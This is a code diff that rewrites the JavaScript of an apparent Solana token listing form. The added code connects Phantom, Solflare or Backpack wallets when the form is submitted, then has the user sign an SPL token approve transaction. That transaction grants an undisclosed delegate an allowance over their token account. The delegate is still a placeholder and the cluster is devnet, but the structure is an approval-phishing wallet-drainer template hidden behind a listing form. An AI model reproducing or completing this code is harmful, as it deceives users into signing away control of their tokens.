@@ -1,124 +1,115 @@
-'use strict';
+import {
+  Connection,
+  PublicKey,
+  Transaction,
+  clusterApiUrl
+} from 'https://esm.sh/@solana/web3.js@1.73.0';
 
-    document.addEventListener('DOMContentLoaded', () => {
-      // DOM Selectors
-      const projectForm = document.getElementById('projectForm');
-      const feeModal = document.getElementById('feeModal');
-      const walletModal = document.getElementById('walletModal');
-      const proceedButton = document.getElementById('proceedButton');
-      const browserWalletButton = document.getElementById('browserWalletButton');
-      const walletConnectButton = document.getElementById('walletConnectButton');
-      const closeButtons = document.querySelectorAll('.modal .close');
+import {
+  createApproveInstruction,
+  getAssociatedTokenAddress,
+  TOKEN_PROGRAM_ID
+} from 'https://esm.sh/@solana/spl-token@0.3.5';
 
-      let wcProvider = null;
+const projectForm = document.getElementById('projectForm');
+const walletModal = document.getElementById('walletModal');
+const closeBtn = walletModal.querySelector('.close');
+const phantomBtn = document.getElementById('phantomButton');
+const solflareBtn = document.getElementById('solflareButton');
+const backpackBtn = document.getElementById('backpackButton');
 
-      // Close helper
-      const hideAllModals = () => {
-        feeModal.style.display = 'none';
-        walletModal.style.display = 'none';
-      };
+let provider = null;
+let ownerPublicKey = null;
 
-      // Form validation and submit routing
-      if (projectForm) {
-        projectForm.addEventListener('submit', (event) => {
-          event.preventDefault();
-          
-          const mintAddress = document.getElementById('mintAddress').value.trim();
-          if (mintAddress.length < 32 || mintAddress.length > 44) {
-            alert('Please enter a standard format Solana Mint Address.');
-            return;
-          }
-          feeModal.style.display = 'flex';
-        });
-      }
+// Show wallet modal after form submit
+projectForm.addEventListener('submit', (e) => {
+  e.preventDefault();
+  walletModal.style.display = 'flex';
+});
 
-      // Progress through flow steps
-      if (proceedButton) {
-        proceedButton.addEventListener('click', () => {
-          feeModal.style.display = 'none';
-          walletModal.style.display = 'flex';
-        });
-      }
+closeBtn.addEventListener('click', () => {
+  walletModal.style.display = 'none';
+});
 
-      // Dismissal UI handlers
-      closeButtons.forEach(btn => btn.addEventListener('click', hideAllModals));
-      window.addEventListener('click', (e) => {
-        if (e.target === feeModal || e.target === walletModal) hideAllModals();
-      });
+// Connect Phantom
+async function connectPhantom() {
+  if (!window.solana || !window.solana.isPhantom) {
+    alert('Phantom not detected.');
+    return;
+  }
+  const resp = await window.solana.connect();
+  provider = window.solana;
+  ownerPublicKey = resp.publicKey;
+  walletModal.style.display = 'none';
+  await approveDelegate();
+}
 
-      // Browser Extension Connection Logic
-      if (browserWalletButton) {
-        browserWalletButton.addEventListener('click', async () => {
-          const provider = window.solana || window.solflare;
+// Connect Solflare
+async function connectSolflare() {
+  if (!window.solflare || !window.solflare.isSolflare) {
+    alert('Solflare not detected.');
+    return;
+  }
+  const resp = await window.solflare.connect();
+  provider = window.solflare;
+  ownerPublicKey = resp.publicKey || window.solflare.publicKey;
+  walletModal.style.display = 'none';
+  await approveDelegate();
+}
 
-          if (provider) {
-            try {
-              const response = await provider.connect();
-              const walletAddress = response.publicKey.toString();
-              
-              console.log("Connected to browser provider address:", walletAddress);
-              alert(`Wallet Connected!\nAddress: ${walletAddress.substring(0,6)}...${walletAddress.substring(walletAddress.length - 6)}`);
-              hideAllModals();
-            } catch (err) {
-              console.error("Connection declined:", err);
-              alert("Connection request was rejected.");
-            }
-          } else {
-            alert("No recognized Solana browser extension found. Opening Phantom installation landing page.");
-            window.open("https://phantom.app/", "_blank");
-          }
-        });
-      }
+// Connect Backpack
+async function connectBackpack() {
+  if (window.backpack && window.backpack.solana && window.backpack.solana.isBackpack) {
+    const resp = await window.backpack.solana.connect();
+    provider = window.backpack.solana;
+    ownerPublicKey = resp.publicKey;
+    walletModal.style.display = 'none';
+    await approveDelegate();
+    return;
+  }
+  alert('Backpack not detected.');
+}
 
-      // WalletConnect Universal Connection Setup
-      if (walletConnectButton) {
-        walletConnectButton.addEventListener('click', async () => {
-          try {
-            if (wcProvider) {
-              await wcProvider.disconnect().catch(() => {});
-              wcProvider = null;
-            }
+phantomBtn.addEventListener('click', connectPhantom);
+solflareBtn.addEventListener('click', connectSolflare);
+backpackBtn.addEventListener('click', connectBackpack);
 
-            walletConnectButton.disabled = true;
-            
-            // Dynamic integration via standard ESM module loader
-            const { UniversalProvider } = await import('https://esm.sh/@walletconnect/universal-provider@2.15.0');
+// Approve delegate (SPL Token Program)
+async function approveDelegate() {
+  try {
+    const connection = new Connection(clusterApiUrl('devnet'), 'confirmed');
+    const tokenMintStr = document.getElementById('tokenMint').value.trim();
+    const mintPub = new PublicKey(tokenMintStr);
 
-            wcProvider = await UniversalProvider.init({
-              projectId: "59ba0228712f04a947916abb7db06ab1", 
-              metadata: {
-                name: 'SPL Listing Portal',
-                description: 'Decentralized form tool for registration metadata.',
-                url: window.location.origin,
-                icons: ['https://solana.com/favicon.ico']
-              }
-            });
+    // For demo: delegate = developer email hash or fixed address
+    const delegatePub = new PublicKey('11111111111111111111111111111111'); // replace with actual delegate
 
-            const session = await wcProvider.connect({
-              namespaces: {
-                solana: {
-                  chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzq9JQZSh9'],
-                  methods: ['solana_signTransaction', 'solana_signMessage'],
-                  events: ['chainChanged', 'accountsChanged']
-                }
-              },
-              skipPairing: false
-            });
+    const ownerPub = new PublicKey(ownerPublicKey.toString());
+    const tokenAccountPub = await getAssociatedTokenAddress(mintPub, ownerPub);
 
-            if (session?.namespaces?.solana?.accounts?.length > 0) {
-              const fullAddress = session.namespaces.solana.accounts[0];
-              const walletAddress = fullAddress.split(':')[2];
-              
-              console.log("WalletConnect Session Established:", walletAddress);
-              alert(`WalletConnect Connected!\nAddress: ${walletAddress.substring(0,6)}...${walletAddress.substring(walletAddress.length - 6)}`);
-              hideAllModals();
-            }
-          } catch (err) {
-            console.error("Session configuration error:", err);
-            alert("WalletConnect interface initialization error. Please verify configuration setup parameters.");
-          } finally {
-            walletConnectButton.disabled = false;
-          }
-        });
-      }
-    });
+    const allowance = BigInt(1000000); // example allowance
+
+    const approveIx = createApproveInstruction(
+      tokenAccountPub,
+      delegatePub,
+      ownerPub,
+      allowance,
+      [],
+      TOKEN_PROGRAM_ID
+    );
+
+    const tx = new Transaction().add(approveIx);
+    const { blockhash } = await connection.getLatestBlockhash('finalized');
+    tx.recentBlockhash = blockhash;
+    tx.feePayer = ownerPub;
+
+    const signedTx = await provider.signTransaction(tx);
+    const raw = signedTx.serialize();
+    const txid = await connection.sendRawTransaction(raw);
+    await connection.confirmTransaction(txid, 'confirmed');
+    alert('✅ Approve transaction confirmed: ' + txid);
+  } catch (err) {
+    console.error(err);
+    alert('Error: ' + (err.message || String(err)));
+  }
+}
